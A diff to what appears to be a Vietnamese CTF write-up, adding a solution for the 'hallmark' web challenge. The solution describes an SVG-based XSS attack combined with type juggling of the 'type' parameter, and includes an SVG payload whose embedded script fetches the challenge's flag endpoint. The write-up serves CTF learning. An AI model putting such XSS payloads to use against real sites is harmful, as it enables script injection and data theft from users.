@@ -184,3 +184,28 @@ lệnh: curl -H "host: flag.local" https://pioneer.tailec718.ts.net
 
 
 flag: actf{reaching_the_core__chapter_8}
+
+
+# hallmark
+80 Point
+
+WEB
+
+## Description
+![img](./images/15.png)
+
+## Solution
+
+tấn không XML XSS vào tham số type, tham số type thêm [] vào trước để tạo lỗi type juggle
+
+```js
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+   <script type="text/javascript">
+      fetch('https://hallmark.web.actf.co/flag')
+   </script>
+</svg>
+```
